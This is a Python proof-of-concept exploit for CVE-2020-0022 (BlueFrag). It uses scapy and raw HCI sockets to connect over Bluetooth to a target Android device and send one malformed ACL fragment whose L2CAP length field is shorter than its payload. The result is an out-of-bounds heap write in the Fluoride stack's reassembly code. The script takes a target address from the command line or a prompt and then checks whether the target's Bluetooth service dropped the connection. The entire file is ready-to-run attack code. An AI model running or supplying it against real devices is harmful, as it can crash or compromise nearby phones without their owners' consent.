#!/usr/bin/env python3
"""CVE-2020-0022 — BlueFrag. Android Fluoride L2CAP heap overflow.
True over-the-air via raw HCI + scapy. Root + Linux + idle BR/EDR adapter.

Trigger: single ACL first-fragment (PB=0b10) whose L2CAP length field is
smaller than the actual ACL payload -> OOB write in reassemble_and_dispatch()."""
import sys, time, socket, struct, subprocess
try:
    import fcntl
except ImportError:
    fcntl = None  # Windows: live HCI driver unavailable; build() still works

try:
    from scapy.layers.bluetooth import (BluetoothHCISocket, HCI_Hdr, HCI_ACL_Hdr,
        HCI_Command_Hdr, HCI_Cmd_Create_Conn, HCI_Event_Conn_Complete)
    SCAPY = True
except Exception:
    SCAPY = False

HCIDEVUP = 0x400448C9
HCIGETCONNLIST = 0x800448D4
EALREADY = 114

def str2ba(m):
    return bytes(int(x, 16) for x in reversed(m.replace("-", ":").split(":")))

def _sock():
    return socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)

def hci_up(dev):
    s = _sock()
    try: fcntl.ioctl(s.fileno(), HCIDEVUP, dev)
    except OSError as e:
        if e.errno != EALREADY: raise
    finally: s.close()

def conn_list(dev, n=32):
    buf = bytearray(4 + n * 12); struct.pack_into("<HH", buf, 0, dev, n)
    s = _sock()
    try: fcntl.ioctl(s.fileno(), HCIGETCONNLIST, buf)
    except OSError: return []
    finally: s.close()
    _, cnt = struct.unpack_from("<HH", buf, 0)
    return [{"handle": struct.unpack_from("<H", buf, 4 + i * 12)[0],
             "bdaddr": ":".join(f"{x:02x}" for x in reversed(buf[6 + i * 12:12 + i * 12]))}
            for i in range(min(cnt, n))]

class BlueFrag:
    def __init__(self, dev=0, verbose=True):
        self.dev, self.v = dev, verbose; self.sock = self.handle = None

    def open(self, take_over=True):
        if take_over: subprocess.run(["hciconfig", f"hci{self.dev}", "down"], check=False)
        hci_up(self.dev)
        self.sock = BluetoothHCISocket(self.dev); self.sock.ins.settimeout(0.5)
        return self

    def close(self):
        if self.sock: self.sock.close()

    def _cmd(self, c): self.sock.send(HCI_Hdr(type=1) / HCI_Command_Hdr() / c)
    def _acl(self, h, pb, bc, d):
        self.sock.send(HCI_Hdr(type=2) / HCI_ACL_Hdr(handle=h, PB=pb, BC=bc, len=len(d)) / d)

    def connect(self, bdaddr, timeout=12.0):
        self._cmd(HCI_Cmd_Create_Conn(bdaddr=str2ba(bdaddr), packet_type=0xCC18,
                                      pscan_rep_mode=2, pscan_mode=0, clock_offset=0, role_switch=1))
        t0 = time.time()
        while time.time() - t0 < timeout:
            try: p = self.sock.recv()
            except Exception: continue
            if p.haslayer(HCI_Event_Conn_Complete) and p[HCI_Event_Conn_Complete].status == 0:
                self.handle = p[HCI_Event_Conn_Complete].handle
                return self.handle
        return None

    def trigger(self, l2cap_len=4, overflow=0x100):
        h = self.handle
        for c in conn_list(self.dev):
            if c["handle"] == h: break
        payload = struct.pack("<HH", l2cap_len, 0x0001) + bytes.fromhex("0a020300") + b"A" * overflow
        self._acl(h, 0b10, 0b00, payload)
        if self.v:
            print(f"[*] TX PB=0b10 l2cap_len=0x{l2cap_len:x} acl={len(payload)}B "
                  f"delta={len(payload)-l2cap_len}B")

    def watch_restart(self, timeout=5.0):
        t0 = time.time()
        while time.time() - t0 < timeout:
            if not any(c["handle"] == self.handle for c in conn_list(self.dev)):
                return True
            time.sleep(0.25)
        return False

def main():
    if not SCAPY:
        print("scapy bluetooth missing: pip install 'scapy[bluetooth]'"); return
    target = sys.argv[1] if len(sys.argv) > 1 else input("target BD_ADDR: ").strip()
    dev = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    bf = BlueFrag(dev).open()
    try:
        if bf.connect(target) is None:
            print("[!] connect failed"); return
        print(f"[+] ACL handle=0x{bf.handle:04x}")
        bf.trigger()
        print("[*] restart suspected" if bf.watch_restart() else "[*] no drop observed")
    finally:
        bf.close()

if __name__ == "__main__":
    main()
